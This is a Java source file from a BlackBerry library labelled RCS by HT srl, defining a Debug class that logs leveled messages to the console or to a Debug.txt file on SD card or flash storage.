/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Debug.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.utils;

import java.util.Date;

import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.fs.Path;

//TODO: ottimizzare per togliere la chiamata in  Release
public class Debug {
    static final String FILE_NAME = "Debug.txt";
    static final String SD_PATH = Path.SD_PATH + FILE_NAME;
    static final String FLASH_PATH = Path.USER_PATH + FILE_NAME;

    public static int level = 6;

    private static boolean logToDebugger = true;
    private static boolean logToSD = false;
    private static boolean logToFlash = false;

    private static AutoFlashFile fileDebug;

    private static boolean enabled = true;
    private static boolean init = false;

    String className = "NONE";
    int actualLevel = 6;

    public Debug(String className_) {
        this(className_, DebugLevel.VERBOSE);
    }

    public Debug(String className_, int classLevel) {
        this.className = className_;
        this.actualLevel = Math.min(classLevel, level);

        if (logToSD) {
            Path.createDirectory(Path.SD_PATH);
        }

        if (logToFlash) {
            Path.createDirectory(Path.USER_PATH);
        }
    }

    /*
     * prior: priorita', da 6 bassa a bassa, level LEVEL = {
     * TRACE,DEBUG,INFO,WARN, ERROR, FATAL }
     */

    public synchronized void init(boolean logToDebugger_, boolean logToFlash_,
            boolean logToSD_) {

        Debug.logToDebugger = logToDebugger_;
        Debug.logToFlash = logToFlash_;
        Debug.logToSD = logToSD_;

        if (fileDebug == null) {
            if (logToSD) {
                fileDebug = new AutoFlashFile(SD_PATH, false);
            } else {
                fileDebug = new AutoFlashFile(FLASH_PATH, false);
            }
        }

        if (!fileDebug.exists()) {
            fileDebug.create();
        }
        if (fileDebug.exists()) {
            fileDebug.delete();
        }
        fileDebug.create();
        init = true;
        
        Date date = new Date();
        info(date.toString());
        
        /*Calendar calendar = Calendar.getInstance();
        calendar.setTime(date);
        info(calendar.toString());*/
    }

    public void error(String message) {
        // #mdebug
        if (enabled) {
            trace("#ERR# " + className + " | " + message, DebugLevel.HIGH);
        }

        // #enddebug
    }

    public void fatal(String message) {
        // #mdebug
        if (enabled) {
            trace("#FTL# " + className + " | " + message, DebugLevel.CRITICAL);
        }

        // #enddebug
    }

    public void info(String message) {
        // #mdebug
        if (enabled) {
            trace("-INF- " + className + " | " + message, DebugLevel.NOTIFY);
        }

        // #enddebug
    }

    private void logToDebugger(String string, int priority) {
        System.out.println(string);
    }

    private synchronized void logToFile(String message, int priority) {
        if (!init) {
            logToDebugger("NOT INIT", DebugLevel.HIGH);
            if (!Debug.logToDebugger) {
                logToDebugger(message, priority);
            }
            return;
        }

        Check.asserts(fileDebug != null, "null filedebug");
        boolean ret = fileDebug.append(message + "\r\n");

        if (ret == false) {
            // TODO: procedura in caso di mancata scrittura
            logToDebugger(message, priority);
        }
    }

    /*
     * Scrive su file il messaggio, in append. Può scegliere se scrivere su
     * /store o su /SDCard Alla partenza dell'applicativo la SDCard non è
     * visibile.
     */

    public void trace(String message) {
        // #mdebug
        if (enabled) {
            trace("-   - " + className + " | " + message, DebugLevel.VERBOSE);
        }

        // #enddebug
    }

    private synchronized void trace(String message, int priority) {
        if (enabled) {
            Check.requires(priority > 0, "priority >0");

            if (priority > actualLevel || message == null) {
                return;
            }

            if (logToDebugger) {
                logToDebugger(message, priority);

            }

            if (logToSD || logToFlash) {
                logToFile(message, priority);
            }
        }
    }

    public void warn(String message) {
        // #mdebug
        if (enabled) {
            trace("-WRN- " + className + " | " + message, DebugLevel.LOW);
        }

        // #enddebug
    }

}
